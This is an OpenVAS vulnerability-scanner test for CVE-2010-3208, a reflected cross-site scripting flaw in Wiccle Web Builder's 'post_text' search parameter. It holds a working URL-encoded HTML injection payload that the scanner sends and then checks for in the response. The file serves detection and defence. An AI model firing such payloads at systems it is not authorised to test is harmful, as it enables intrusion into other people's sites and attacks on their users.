###############################################################################
# OpenVAS Vulnerability Test
#
# Wiccle Web Builder 'post_text' Cross-Site Scripting Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (C) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801288");
  script_version("2020-08-24T15:18:35+0000");
  script_tag(name:"last_modification", value:"2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)");
  script_tag(name:"creation_date", value:"2010-09-15 08:47:45 +0200 (Wed, 15 Sep 2010)");
  script_cve_id("CVE-2010-3208");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("Wiccle Web Builder 'post_text' Cross-Site Scripting Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/41191");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/61466");
  script_xref(name:"URL", value:"http://www.packetstormsecurity.com/1008-exploits/wiccle-xss.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to execute arbitrary
  web script or HTML in a user's browser session in the context of an affected site.");

  script_tag(name:"affected", value:"Wiccle Web Builder (WWB) Versions 1.00 and 1.0.1");

  script_tag(name:"insight", value:"The flaw is caused by improper validation of user-supplied input
  passed via the 'post_text' parameter in a site 'custom_search' action to
  'index.php', that allows attackers to execute arbitrary HTML and script code on the web server.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"The host is running Wiccle Web Builder and is prone to Cross-Site
  scripting vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("misc_func.inc");

port = http_get_port(default:80);

if(!http_can_host_php(port:port))
  exit(0);

vt_strings = get_vt_strings();

foreach dir (make_list_unique("/wwb", "/", http_cgi_dirs(port:port))) {

  if(dir == "/") dir = "";

  req = http_get(item:string(dir,"/index.php?module=site&show=home"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

  if("Powered by Wiccle - Wiccle Web Builder" >< res) {
    url = dir+ "/index.php?module=site&show=post_search&post_text=%3Cmarquee" +
          "%3E%3Cfont%20color=red%20size=15%3E" + vt_strings["lowercase"] + "%20Attack%3C/font" +
          "%3E%3C/marquee%3E";

    if(http_vuln_check(port:port, url:url, pattern:"<b><marquee><font color=" +
                       "red size=15>" + vt_strings["lowercase"] + "</font></marquee>")) {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);
